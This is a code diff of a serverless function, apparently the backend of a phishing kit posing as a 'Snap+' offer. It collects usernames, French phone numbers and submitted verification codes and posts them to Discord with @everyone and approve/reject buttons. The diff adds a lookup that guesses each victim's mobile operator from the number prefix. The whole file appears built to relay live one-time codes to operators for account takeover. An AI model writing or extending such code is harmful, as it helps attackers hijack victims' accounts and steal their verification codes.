@@ -6,6 +6,58 @@ const corsHeaders = {
   'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
 };
 
+// Détection de l'opérateur français basé sur les préfixes ARCEP
+function detectOperator(phone: string): { name: string; emoji: string } {
+  const cleanPhone = phone.replace(/\s/g, '').replace(/^0/, '');
+  const prefix = cleanPhone.substring(0, 3); // ex: "612", "750"
+  
+  // Préfixes Orange
+  const orangePrefixes = [
+    '607', '608', '609', '610', '611', '612', '613', '614', '615', '616', '617', '618', '619',
+    '620', '621', '622', '623', '624', '625', '626', '627', '628', '629',
+    '670', '671', '672', '673', '674', '675', '676', '677', '678', '679',
+    '680', '681', '682', '683', '684', '685', '686', '687', '688', '689',
+    '730', '731', '732', '733', '734', '735', '736', '737', '738', '739',
+    '780', '781', '782', '783', '784', '785', '786', '787', '788', '789'
+  ];
+  
+  // Préfixes SFR
+  const sfrPrefixes = [
+    '600', '601', '602', '603', '604', '605', '606',
+    '630', '631', '632', '633', '634', '635', '636', '637', '638', '639',
+    '660', '661', '662', '663', '664', '665', '666', '667', '668', '669',
+    '760', '761', '762', '763', '764', '765', '766', '767', '768', '769'
+  ];
+  
+  // Préfixes Bouygues
+  const bouyguesPrefixes = [
+    '640', '641', '642', '643', '644', '645', '646', '647', '648', '649',
+    '650', '651', '652', '653', '654', '655', '656', '657', '658', '659',
+    '698', '699',
+    '700', '701', '702', '703', '704', '705', '706', '707', '708', '709',
+    '740', '741', '742', '743', '744', '745', '746', '747', '748', '749'
+  ];
+  
+  // Préfixes Free
+  const freePrefixes = [
+    '690', '691', '692', '693', '694', '695', '696', '697',
+    '750', '751', '752', '753', '754', '755', '756', '757', '758', '759',
+    '770', '771', '772', '773', '774', '775', '776', '777', '778', '779'
+  ];
+
+  if (orangePrefixes.includes(prefix)) {
+    return { name: 'Orange', emoji: '🟠' };
+  } else if (sfrPrefixes.includes(prefix)) {
+    return { name: 'SFR', emoji: '🔴' };
+  } else if (bouyguesPrefixes.includes(prefix)) {
+    return { name: 'Bouygues', emoji: '🔵' };
+  } else if (freePrefixes.includes(prefix)) {
+    return { name: 'Free', emoji: '🟣' };
+  }
+  
+  return { name: 'Inconnu', emoji: '⚪' };
+}
+
 serve(async (req) => {
   if (req.method === 'OPTIONS') {
     return new Response(null, { headers: corsHeaders });
@@ -25,10 +77,13 @@ serve(async (req) => {
 
     const { username, phone, code, step, submissionId } = await req.json();
 
-    // Formater le numéro de téléphone avec espaces (garde le 0)
+    // Formater le numéro de téléphone avec espaces
     const formatPhone = (p: string) => {
       return p.replace(/(\d{2})(\d{2})(\d{2})(\d{2})(\d{2})/, '$1 $2 $3 $4 $5');
     };
+
+    // Détecter l'opérateur
+    const operator = detectOperator(phone);
 
     // Si c'est le formulaire initial, créer une entrée
     if (step === "form") {
@@ -42,8 +97,8 @@ serve(async (req) => {
 
       const embed = {
         title: "📱 Nouvelle demande Snap+",
-        description: `👤 **Nom d'utilisateur:** ${username}\n\n📞 **Téléphone:** ${formatPhone(phone)}`,
-        color: 0xFFA500, // Orange
+        description: `👤 **Nom d'utilisateur:** ${username}\n\n📞 **Téléphone:** ${formatPhone(phone)}\n\n${operator.emoji} **Opérateur:** ${operator.name}`,
+        color: 0xFFA500,
         footer: { 
           text: "⏳ En attente du code de vérification..."
         },
@@ -85,17 +140,15 @@ serve(async (req) => {
         second: '2-digit' 
       });
 
-      // Style exactement comme l'image
       const embed = {
         title: "🔐 Code de vérification soumis",
-        description: `👤 **Nom d'utilisateur:** ${username}\n\n🔢 **Code saisi:** \`${code}\`\n\n📞 **Téléphone:** ${formatPhone(phone)}\n\n📅 **Soumis à:** ${dateStr} ${timeStr}`,
-        color: 0xFFA500, // Orange comme l'image
+        description: `👤 **Nom d'utilisateur:** ${username}\n\n🔢 **Code saisi:** \`${code}\`\n\n📞 **Téléphone:** ${formatPhone(phone)}\n\n${operator.emoji} **Opérateur:** ${operator.name}\n\n📅 **Soumis à:** ${dateStr} ${timeStr}`,
+        color: 0xFFA500,
         footer: { 
           text: "En attente de validation par un modérateur"
         },
       };
 
-      // Message avec @everyone et boutons
       const payload = {
         content: "@everyone",
         embeds: [embed],
@@ -105,13 +158,13 @@ serve(async (req) => {
             components: [
               {
                 type: 2,
-                style: 3, // Vert
+                style: 3,
                 label: "Accepter",
                 custom_id: `approve_${submissionId}`,
               },
               {
                 type: 2,
-                style: 4, // Rouge
+                style: 4,
                 label: "Refuser",
                 custom_id: `reject_${submissionId}`,
               }
